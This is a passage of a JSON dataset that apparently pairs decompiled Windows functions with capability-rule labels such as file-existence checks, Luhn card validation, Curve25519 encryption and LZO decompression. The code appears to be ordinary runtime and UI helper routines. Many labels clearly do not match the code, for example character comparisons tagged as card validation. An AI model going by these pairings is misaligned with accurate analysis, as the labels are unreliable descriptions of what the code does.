        "decompiled_code": "\nint32_t __cdecl fcn.0045cc6f(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_stack_ffffffd8;\n    \n    if ((*0x6cae40 == -1) || (iVar1 = fcn.00460440(*0x6cae40),  iVar1 == 0)) {\n        iVar1 = fcn.0046047f(*0x6cae40, 0xffffffff);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00460ec9(1, 0x364);\n            if (iVar1 == 0) {\n                fcn.0046047f(*0x6cae40, 0);\n                iVar1 = in_stack_ffffffd8;\n            }\n            else {\n                iVar2 = fcn.0046047f(*0x6cae40, iVar1);\n                if (iVar2 != 0) {\n                    fcn.0045ca2f(iVar1, 0x6cd608);\n                    fcn.0045d185(0);\n                    goto code_r0x0045cd03;\n                }\n                fcn.0046047f(*0x6cae40, 0);\n            }\n            fcn.0045d185(iVar1);\n        }\n    }\n    else if (iVar1 != -1) {\ncode_r0x0045cd03:\n        return arg_ch * 0x364 + iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 338
    },
    "0045cf1e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0045cf1e(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((*0x6cae40 == -1) || (iVar2 = fcn.00460440(*0x6cae40),  iVar2 == 0)) {\n        iVar2 = fcn.0046047f(*0x6cae40, 0xffffffff);\n        if (iVar2 != 0) {\n            iVar2 = fcn.00460ec9(1, 0x364);\n            if (iVar2 == 0) {\n                fcn.0046047f(*0x6cae40, 0);\n            }\n            else {\n                iVar3 = fcn.0046047f(*0x6cae40, iVar2);\n                if (iVar3 != 0) {\n                    fcn.0045ca2f(iVar2, 0x6cd608);\n                    fcn.0045d185(0);\n                    return iVar2;\n                }\n                fcn.0046047f(*0x6cae40, 0);\n            }\n            fcn.0045d185(iVar2);\n        }\n    }\n    else if (iVar2 != -1) {\n        return iVar2;\n    }\n    fcn.0045ad41();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 316
    },
    "0045d065": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045d065(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffffd4;\n    \n    iVar3 = 0;\n    if ((*0x6cae40 == -1) || (iVar1 = fcn.00460440(*0x6cae40),  iVar1 == 0)) {\n        iVar1 = fcn.0046047f(*0x6cae40, 0xffffffff);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.00460ec9(1, 0x364);\n        if (iVar1 == 0) {\n            fcn.0046047f(*0x6cae40, 0);\n            iVar1 = in_stack_ffffffd4;\n        }\n        else {\n            iVar2 = fcn.0046047f(*0x6cae40, iVar1);\n            if (iVar2 != 0) {\n                fcn.0045ca2f(iVar1, 0x6cd608);\n                fcn.0045d185(0);\n                goto code_r0x0045d0f9;\n            }\n            fcn.0046047f(*0x6cae40, 0);\n        }\n        fcn.0045d185(iVar1);\n    }\n    else {\n        if (iVar1 == -1) {\n            return 0;\n        }\ncode_r0x0045d0f9:\n        iVar3 = arg_ch * 0x364 + iVar1;\n    }\n    return iVar3;\n}\n",
        "token_count": 371
    },
    "0045ffc5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045ffc5(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint var_4h;\n    \n    do {\n        if (arg_8h == arg_ch) {\n            return 0;\n        }\n        iVar2 = *arg_8h;\n        iVar3 = *(iVar2 * 4 + 0x6cd838);\n        if (iVar3 == 0) {\n            arg_8h_00 = *(iVar2 * 4 + 0x47eda8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg_8h_00, 0, 0x800);\n            if ((iVar3 != 0) ||\n               ((((iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 == 0x57 &&\n                  (iVar3 = fcn.0045c648(arg_8h_00, L\"api-ms-\", 7),  iVar3 != 0)) &&\n                 (iVar3 = fcn.0045c648(arg_8h_00, L\"ext-ms-\", 7),  iVar3 != 0)) &&\n                (iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg_8h_00, 0, 0),  iVar3 != 0)))) {\n                piVar1 = iVar2 * 4 + 0x6cd838;\n                iVar2 = *piVar1;\n                *piVar1 = iVar3;\n                if (iVar2 == 0) {\n                    return iVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                return iVar3;\n            }\n            *(iVar2 * 4 + 0x6cd838) = 0xffffffff;\n        }\n        else if (iVar3 != -1) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 465
    },
    "004615a2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_298h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004615a2(char *arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *arg_8h_00;\n    int32_t iVar6;\n    int32_t var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint32_t lpFileName;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint32_t var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    int32_t *var_25ch;\n    uint var_255h;\n    uint var_228h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_25ch = arg_10h;\n    if (arg_ch != arg_8h) {\n        do {\n            cVar1 = *arg_ch;\n            if (((cVar1 == '/') || (cVar1 == '\\\\')) || (cVar1 == ':')) break;\n            arg_ch = fcn.0046e150(arg_8h, arg_ch);\n        } while (arg_ch != arg_8h);\n    }\n    var_255h._0_1_ = *arg_ch;\n    if ((var_255h == ':') && (arg_ch != arg_8h + 1)) {\n        fcn.0046143d(arg_8h, 0, 0, var_25ch);\n    }\n    else {\n        if (((var_255h == '/') || (var_255h == '\\\\')) || (uVar2 = 0,  var_255h == ':')) {\n            uVar2 = 1;\n        }\n        var_28ch = 0;\n        var_288h = 0;\n        lpFileName = 0;\n        var_280h = 0;\n        var_27ch = 0;\n        var_278h._0_1_ = '\\0';\n        uVar3 = fcn.00461cef();\n        iVar4 = fcn.004610ce(arg_8h, &var_28ch, uVar3);\n        iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(~-(iVar4 != 0) & lpFileName, 0, &var_255h + 1, 0, 0, 0);\n        if (iVar4 == -1) {\n            fcn.0046143d(arg_8h, 0, 0, var_25ch);\n            if (var_278h != '\\0') {\n                fcn.0045d185(lpFileName);\n            }\n        }\n        else {\n            iVar6 = var_25ch[1] - *var_25ch >> 2;\n            do {\n                var_274h = 0;\n                var_270h = 0;\n                var_26ch = 0;\n                var_268h = 0;\n                var_264h = 0;\n                var_260h._0_1_ = '\\0';\n                uVar3 = fcn.00461cef();\n                iVar5 = fcn.00461008(&var_228h, &var_274h, &var_255h, uVar3);\n                arg_8h_00 = ~-(iVar5 != 0) & var_26ch;\n                if (((*arg_8h_00 != '.') ||\n                    ((arg_8h_00[1] != '\\0' && ((arg_8h_00[1] != '.' || (arg_8h_00[2] != '\\0')))))) &&\n                   (var_298h = fcn.0046143d(arg_8h_00, arg_8h, -uVar2 & arg_ch + (1 - arg_8h), var_25ch),  var_298h != 0\n                   )) {\n                    if (var_260h != '\\0') {\n                        fcn.0045d185(var_26ch);\n                    }\n                    (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n                    if (var_278h != '\\0') {\n                        fcn.0045d185(lpFileName);\n                    }\n                    goto code_r0x00461819;\n                }\n                if (var_260h != '\\0') {\n                    fcn.0045d185(var_26ch);\n                }\n                iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar4, &var_255h + 1);\n            } while (iVar5 != 0);\n            iVar5 = var_25ch[1] - *var_25ch >> 2;\n            if (iVar6 != iVar5) {\n                fcn.0046dc20(*var_25ch + iVar6 * 4, iVar5 - iVar6, 4, fcn.00460f26);\n            }\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n            if (var_278h != '\\0') {\n                fcn.0045d185(lpFileName);\n            }\n        }\n    }\ncode_r0x00461819:\n    fcn.004303e9(var_298h);\n    return;\n}\n",
        "token_count": 1239
    },
    "0046d766": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d766(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_10h_00;\n    uint32_t uVar5;\n    ulong uVar6;\n    \n    uVar1 = fcn.0045efb0(arg_ch);\n    if ((arg_ch[3] & 0xc0U) == 0) {\n        iVar4 = fcn.0046f10e(uVar1, &arg_8h, 1, arg_10h);\n        uVar1 = -(iVar4 + -1) & 0xffffff00U | 1 - (iVar4 + -1 != 0);\n    }\n    else {\n        uVar5 = 0;\n        arg_10h_00 = *arg_ch - arg_ch[1];\n        *arg_ch = arg_ch[1] + 1;\n        arg_ch[2] = arg_ch[6] + -1;\n        if (arg_10h_00 < 1) {\n            if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n                uVar2 = 0x6cafb8;\n            }\n            else {\n                uVar2 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x6cd630);\n            }\n            if ((*(uVar2 + 0x28) & 0x20) != 0) {\n                uVar6 = fcn.00471e82(uVar1, 0, 0, 2);\n                uVar2 = uVar6 & uVar6 >> 0x20;\n                if (uVar2 == 0xffffffff) {\n                    puVar3 = arg_ch + 3;\n                    LOCK();\n                    *puVar3 = *puVar3 | 0x10;\n                    return CONCAT31(puVar3 >> 8, 1);\n                }\n            }\n        }\n        else {\n            uVar2 = fcn.0046f10e(uVar1, arg_ch[1], arg_10h_00, arg_10h);\n            uVar5 = uVar2;\n        }\n        *arg_ch[1] = arg_8h;\n        uVar1 = uVar2 & 0xffffff00 | uVar5 == arg_10h_00;\n    }\n    return uVar1;\n}\n",
        "token_count": 572
    },
    "00471c54": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00471c54(uint32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00465133(arg_8h);\n    if (iVar2 == -1) {\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 9;\n    }\n    else {\n        iVar2 = fcn.00471d34(iVar2, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != -1) {\n            puVar1 = *((arg_8h >> 6) * 4 + 0x6cd630) + 0x28 + (arg_8h & 0x3f) * 0x38;\n            *puVar1 = *puVar1 & 0xfd;\n            return iVar2;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 237
    },
    "00474631": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00474631(void)\n\n{\n    if (*0x6cb690 == -2) {\n        fcn.00474612();\n    }\n    return *0x6cb690 != -1;\n}\n",
        "token_count": 47
    },
    "00474650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00474650(void)\n\n{\n    if ((*0x6cb690 != -1) && (*0x6cb690 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x6cb690);\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004065c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004065c0(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_EDI;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_18h = 0x14;\n    _var_14h = 0;\n    _var_ch = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"comctl32.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"DllGetVersion\");\n        if (pcVar2 == NULL) {\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n        }\n        else {\n            iVar3 = (*pcVar2)(&var_18h);\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n            if ((-1 < iVar3) && (5 < var_14h)) {\n                fcn.004303e9(unaff_EDI);\n                return;\n            }\n        }\n    }\n    fcn.004303e9(unaff_EDI);\n    return;\n}\n",
        "token_count": 304
    },
    "00448291": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.00448291(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.0043fee1(arg_8h_00);\n    cVar3 = fcn.0043fee1(arg_10h);\n    cVar4 = fcn.0043fd3f(arg_8h_00);\n    cVar5 = fcn.0043fd3f(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0043fdcd(arg_8h_00);\n            cVar3 = fcn.0043fdcd(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.0045027c(arg_8h[3]);\n            iVar7 = fcn.0045027c(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.0043ff48(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.0043ff48(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 640
    },
    "004483ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nbool __cdecl fcn.004483ac(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_8h;\n    uint var_3h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_8h_00 = uVar1;\n    if ((uVar1 == 0x70) || (arg_10h == 0x70)) {\n        return (uVar1 == 0x70) != (arg_10h != 0x70);\n    }\n    cVar2 = fcn.0043fefc(arg_8h_00);\n    cVar3 = fcn.0043fefc(arg_10h);\n    cVar4 = fcn.0043fd5a(arg_8h_00);\n    cVar5 = fcn.0043fd5a(arg_10h);\n    if (cVar2 == '\\0') {\n        if (cVar3 != '\\0') {\n            return false;\n        }\n        if (cVar4 == '\\0') {\n            if (cVar5 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0043fe08(arg_8h_00);\n            cVar3 = fcn.0043fe08(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar6 = fcn.0045027c(arg_8h[3]);\n            iVar7 = fcn.0045027c(arg_14h);\n            return iVar6 == iVar7;\n        }\n    }\n    else if (cVar2 != cVar3) {\n        return false;\n    }\n    if (cVar4 == cVar5) {\n        cVar2 = fcn.0043ff48(*in_ECX, in_ECX[1], arg_8h_00, arg_8h[3]);\n        cVar3 = fcn.0043ff48(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 640
    },
    "00447414": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00447414(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    return in_ECX + (arg_8h & 0x7f) * 2;\n}\n",
        "token_count": 53
    },
    "00447b9e": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447b9e(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 141
    },
    "00447bdb": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447bdb(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 139
    },
    "00447c18": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447c18(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e299);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *(((arg_ch & 0xff) + uVar1 * 8 & 0x7f) * 2 + 0x47e298);\n}\n",
        "token_count": 140
    },
    "00447c53": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447c53(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 140
    },
    "00447c90": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447c90(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 140
    },
    "00447ccd": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447ccd(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e299);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *(((arg_ch & 0xff) + uVar1 * 8 & 0x7f) * 2 + 0x47e298);\n}\n",
        "token_count": 139
    },
    "00447d08": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447d08(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 142
    },
    "00447d44": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447d44(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 142
    },
    "00447d80": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447d80(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e299);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *(((arg_ch & 0xff) + uVar1 * 8 & 0x7f) * 2 + 0x47e298);\n}\n",
        "token_count": 142
    },
    "00447dba": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447dba(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 141
    },
    "00447df6": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447df6(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e399);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x47e398);\n}\n",
        "token_count": 142
    },
    "00447e32": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00447e32(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x47e299);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *(((arg_ch & 0xff) + uVar1 * 8 & 0x7f) * 2 + 0x47e298);\n}\n",
        "token_count": 142
    },
    "00406ab0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406ab0(uint noname_0, uint noname_1, int32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t arg_14h;\n    int32_t lptpm;\n    int32_t arg_10h_00;\n    int32_t hMenu;\n    int32_t uFlags;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_10h != NULL) && (*arg_10h == 0x18)) {\n        arg_14h = arg_10h[4];\n        lptpm = arg_10h[5];\n        arg_10h_00 = arg_10h[3];\n        hMenu = arg_10h[1];\n        uFlags = arg_10h[2];\n        iVar2 = (*_sym.imp.USER32.dll_IsMenu)(hMenu);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        uVar1 = *(in_ECX + 0x85);\n        *(in_ECX + 0x84) = *(in_ECX + 0x84) | 0x10;\n        if ((uVar1 & 2) != 0) {\n            *(in_ECX + 0x85) = (uVar1 >> 2 ^ uVar1) & 4 ^ uVar1;\n        }\n        uVar3 = fcn.00404b30(hMenu, uFlags, arg_10h_00, arg_14h, lptpm);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 378
    },
    "0040d5b0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d5b0(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint8_t uVar1;\n    \n    uVar1 = *(in_ECX + 0x85) & 0xfb | arg_8h << 2;\n    *(in_ECX + 0x85) = uVar1;\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x446, 0x100000, ~((uVar1 >> 2) << 0x14) & 0x100000);\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 4), 0, 1);\n    (*_sym.imp.USER32.dll_UpdateWindow)(*(in_ECX + 4));\n    return;\n}\n",
        "token_count": 183
    },
    "0047096f": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0047096f(uint32_t arg_8h)\n\n{\n    return (((arg_8h & 0x400 | (arg_8h >> 2 & 0x400 | arg_8h & 0x800) >> 2) >> 2 | arg_8h & 0x200) >> 3 | arg_8h & 0x180\n           ) >> 3;\n}\n",
        "token_count": 98
    },
    "00470a7c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470a7c(uint32_t arg_8h)\n\n{\n    return arg_8h >> 2 & 0x1000;\n}\n",
        "token_count": 40
    },
    "00470f9b": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470f9b(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    uVar1 = arg_8h & 0x8040;\n    if (uVar1 == 0x8000) {\n        uVar3 = 0xc00;\n    }\n    else if (uVar1 == 0x40) {\n        uVar3 = 0x800;\n    }\n    else {\n        uVar3 = 0x400;\n        if (uVar1 != 0x8040) {\n            uVar3 = 0;\n        }\n    }\n    uVar2 = arg_8h & 0x6000;\n    if (uVar2 != 0) {\n        if (uVar2 == 0x2000) {\n            uVar4 = 0x100;\n        }\n        else if (uVar2 == 0x4000) {\n            uVar4 = 0x200;\n        }\n        else if (uVar2 == 0x6000) {\n            uVar4 = 0x300;\n        }\n    }\n    return (((arg_8h & 0x400 | (arg_8h >> 2 & 0x400 | arg_8h & 0x800) >> 2) >> 2 | arg_8h & 0x200) >> 3 | arg_8h & 0x180\n           ) >> 3 | uVar3 | uVar4;\n}\n",
        "token_count": 364
    },
    "004711ae": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
